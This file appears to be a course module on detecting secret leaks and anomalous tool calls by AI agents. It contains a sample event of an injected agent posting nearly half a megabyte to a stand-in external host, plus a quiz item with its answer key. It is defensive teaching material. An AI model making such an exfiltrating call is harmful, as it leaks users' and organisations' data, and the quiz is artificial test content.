/* 5.3 · Section 3: secret exposure and tool execution anomalies */
module.exports = {
  title: 'Secret exposure and tool execution anomalies', covers: [3],
  blocks: [
    { type: 'video', title: 'Leaked keys and strange tool calls', kicker: 'Module 5.3 · Video 3 of 5', scenes: [
      { t: 'title', kicker: 'Module 5.3 · Runtime detection', title: 'Leaked keys and strange tool calls', sub: 'Secret exposure and tool execution anomalies', icon: 'key',
        say: 'AI systems handle secrets in more places than most teams realise, and agents turn model outputs into real actions. Both create signals worth watching. | This video covers detecting secret exposure, and spotting anomalies in how tools are executed.' },
      { t: 'bullets', title: 'Where secrets leak in AI systems', layout: 'grid', cols: 2, items: [
          { icon: 'chat', h: 'Prompts', d: 'Users paste keys and passwords', k: 'data' },
          { icon: 'gear', h: 'System prompts and configs', d: 'Keys embedded for convenience', k: 'human' },
          { icon: 'doc', h: 'Retrieved documents', d: 'Credentials in indexed files', k: 'neutral' },
          { icon: 'text', h: 'Model outputs', d: 'Secrets repeated or memorised', k: 'model' },
          { icon: 'memory', h: 'Agent memory and traces', d: 'Tokens kept between steps', k: 'threat' },
          { icon: 'code', h: 'Code and notebooks', d: 'Provider keys in repositories', k: 'control' } ],
        say: 'Secrets leak from AI systems in six main places. | Prompts, where users paste keys, passwords and connection strings while asking for help. | System prompts and configuration files, where developers embed keys for convenience. | Retrieved documents: indexed files that happen to contain credentials, which the assistant can then quote. | Model outputs, which may repeat secrets from the context or, occasionally, from training data. | Agent memory and traces, where tokens are kept between steps and written to logs. | And code and notebooks, where AI provider keys are committed to repositories.' },
      { t: 'flow', title: 'Responding to an exposed secret',
        nodes: [
          { id: 'det', x: 230, y: 330, icon: 'search', label: 'Detect', sub: 'scanners on every channel', k: 'threat', w: 310 },
          { id: 'cls', x: 700, y: 330, icon: 'tag', label: 'Classify', sub: 'which system, what rights', k: 'neutral', w: 310 },
          { id: 'rev', x: 1200, y: 330, icon: 'key', label: 'Revoke and rotate', sub: 'treat as compromised', k: 'control', w: 310 },
          { id: 'use', x: 1200, y: 690, icon: 'audit', label: 'Check for use', sub: 'who used it, and when?', k: 'human', w: 310 },
          { id: 'pur', x: 700, y: 690, icon: 'trash', label: 'Purge copies', sub: 'logs, memory, indexes', k: 'data', w: 300 },
          { id: 'fix', x: 230, y: 690, icon: 'lock', label: 'Fix the cause', sub: 'vault, short-lived tokens', k: 'model', w: 310 } ],
        edges: [{ from: 'det', to: 'cls', k: 'threat' }, { from: 'cls', to: 'rev', k: 'neutral' }, { from: 'rev', to: 'use', k: 'control' }, { from: 'use', to: 'pur', k: 'human' }, { from: 'pur', to: 'fix', k: 'data' }],
        steps: [
          { show: 'det', hi: 'det', mark: { det: 'alert' } },
          { show: 'cls det-cls', flow: 'det-cls', hi: 'cls' },
          { show: 'rev cls-rev', flow: 'cls-rev', hi: 'rev', mark: { rev: 'lock' } },
          { show: 'use rev-use', flow: 'rev-use', hi: 'use' },
          { show: 'pur use-pur', flow: 'use-pur', hi: 'pur' },
          { show: 'fix pur-fix', flow: 'pur-fix', hi: 'fix', mark: { fix: 'ok' } } ],
        say: 'When a secret is exposed, act quickly and in order. Scanners on prompts, outputs, documents, logs and repositories detect it. | Classify it: which system does it unlock, and with what rights? | Revoke and rotate it straight away. Once it has passed through an AI system, treat it as compromised. | Check whether it was used, by whom and when, using the target system’s logs. | Purge the copies: from telemetry, agent memory, caches and any index that ingested it. | And fix the cause, for example by moving keys into a vault and using short-lived, scoped tokens.' },
      { t: 'code', title: 'Reading a suspicious tool call', file: 'tool-call-event.json',
        code: `{
  "trace_id": "4f2a...91c",
  "agent": "invoice-assistant",
  "on_behalf_of": "user:3381",
  "tool": "http.post",
  "args": {
    "url": "https://files.unknown-site.example",
    "body_bytes": 482113
  },
  "first_use_of_tool": true,
  "previous_step": "read_document(contract_88)",
  "injection_score": 0.91,
  "approval": null
}`,
        hl: [null, [5, 5], [6, 9], [10, 11], [12, 13]],
        notes: [{ h: 'One tool-call record', d: 'Structured events make anomalies easy to spot and correlate.' }, { h: 'Unexpected tool', d: 'An invoice assistant has no reason to post data to the web.', k: 'threat' }, { h: 'Unknown destination, large payload', d: 'A new domain and nearly half a megabyte of data.', k: 'threat' }, { h: 'Context of the call', d: 'First use of the tool, straight after reading an external document.', k: 'human' }, { h: 'Risk score, no approval', d: 'A high injection score on the source, and no human approved the action.', k: 'control' }],
        say: 'Here is a single tool-call event, recorded by an agent framework. Structured records like this make anomalies easy to spot. | The tool itself is the first warning: an invoice assistant has no business posting data to the web. | The destination is a domain the organisation has never used, and the request carries nearly half a megabyte. | The context matters too: this is the first time the agent has used the tool, straight after reading an external contract. | And the document it read scored high for injected instructions, while no human approved the action. Each signal is suspicious alone. Together, they describe a likely hijacked agent exfiltrating data.' },
      { t: 'bullets', title: 'Tool execution anomalies', layout: 'grid', cols: 2, items: [
          { icon: 'tool', h: 'Unexpected tool for the task', d: 'Outside the purpose profile', k: 'threat' },
          { icon: 'filter', h: 'Unusual arguments', d: 'Wildcards, bulk ranges, odd characters', k: 'human' },
          { icon: 'globe', h: 'New destinations', d: 'Domains, recipients, accounts', k: 'data' },
          { icon: 'alert', h: 'Error bursts', d: 'Repeated failures suggest probing', k: 'neutral' },
          { icon: 'split', h: 'Risky chains', d: 'Sensitive read, then external send', k: 'model' },
          { icon: 'box', h: 'Sandbox violations', d: 'Blocked process or network attempts', k: 'control' } ],
        say: 'Six kinds of tool anomaly deserve detections. | A tool that doesn’t fit the agent’s task or purpose profile. | Unusual arguments, such as wildcards, very large ranges, or characters that look like attempts to break out of the expected format. | New destinations: domains, email recipients or accounts the agent has never used. | Bursts of errors, which can mean an attacker, or a manipulated agent, probing for what works. | Risky chains, where a read from a sensitive source is followed by a send to an external one. | And sandbox violations: attempts to start processes, reach the network or touch files that the sandbox blocks.' },
      { t: 'summary', items: ['Scan prompts, outputs, documents, memory, logs and code for secrets', 'Exposed secret: revoke, rotate, check use, purge copies, fix cause', 'Record tool calls as structured events with context', 'Alert on wrong tools, odd arguments, new destinations and risky chains'],
        say: 'To recap. | Scan prompts, outputs, retrieved documents, agent memory, logs and code for secrets. | When one is exposed, revoke and rotate it, check whether it was used, purge every copy and fix the cause. | Record every tool call as a structured event, with its context. | And alert on unexpected tools, unusual arguments, new destinations, error bursts, risky chains and sandbox violations.' } ] },
    { type: 'text', md: `### Detecting secret exposure
- **Scan every channel:** prompts and outputs at the gateway, retrieved documents at ingestion (before indexing), agent memory and traces, logs, and code repositories and notebooks (Module 4.5).
- **Use several detection methods:** provider-specific key patterns, entropy checks, validated detectors that confirm a key is live, and **honeytokens**: decoy credentials that should never be used, so any use is an alert.
- **Act on findings:** revoke and rotate, then check the target system’s logs for use. Remove the secret from telemetry, caches, memory and vector indexes, which may otherwise keep serving it.
- **Prevent recurrence:** keep secrets in a vault, issue short-lived scoped tokens to agents, never put secrets in system prompts (OWASP LLM07 warns that system prompts can leak), and keep credentials out of the model’s context entirely by having tools fetch them server-side.

### Detecting tool execution anomalies
Agents turn model outputs into actions, so tool calls are where manipulation becomes harm (Module 4.6).
- **Record every tool call** as a structured event: agent and version, delegated user, tool, arguments (masked where sensitive), destination, result size, approval, and the previous steps that led to it.
- **Profile tools per agent:** which tools, destinations and argument ranges are normal. Flag first use, out-of-profile arguments and new destinations.
- **Detect chains, not just calls:** read-then-send sequences, especially sensitive-source to external-destination, are a strong exfiltration signal after possible injection.
- **Watch sandboxes:** process creation, outbound connections and file access outside the allowed set are high-confidence detections for code-executing agents.
- **Validate before execution:** detection complements controls that check tool arguments against schemas and policy before the call runs (Module 4.4). Where a check fails, the attempt itself is worth an alert.` },
    { type: 'steps', title: 'An employee pastes a cloud key into a prompt', items: [
      ['Detect and remove', 'The gateway’s secret scanner finds the key, removes it from the prompt and telemetry, and raises an alert.'],
      ['Revoke and rotate', 'The cloud team disables the key and issues a replacement through the vault.'],
      ['Check for use', 'Cloud audit logs are searched for any use of the old key since it was pasted.'],
      ['Purge copies', 'Provider retention, conversation history and any caches are checked, and copies removed where possible.'],
      ['Fix and educate', 'The service moves to short-lived credentials, and the employee is shown the safe way to get help.'] ] },
    { type: 'callout', kind: 'exam', title: 'Secrets and tools questions', md: `For exposed secrets, the best first action is almost always **revoke and rotate**, followed by checking for use and purging copies. "Delete the log entry" or "ask the user not to do it again" leaves a live credential. For agents, look for **structured tool-call telemetry**, **per-agent profiles** and **chain-based detections**.` },
    { type: 'check', q: { q: 'A developer’s AI provider key is found in a public code repository. It was committed three days ago. What should happen FIRST?', o: ['Remove the key from the repository history, so it can no longer be seen there', 'Revoke the key and issue a new one, then review usage since the commit', 'Ask the developer to make the repository private for now', 'Monitor the key’s usage for a week to see whether anyone else is using it'], a: 1, b: 3,
      why: 'A publicly exposed key must be treated as compromised, so revoking it stops any misuse at once; usage logs then show whether it was abused. Cleaning history or hiding the repository leaves the key valid, and monitoring delays containment.' } }
  ]
};
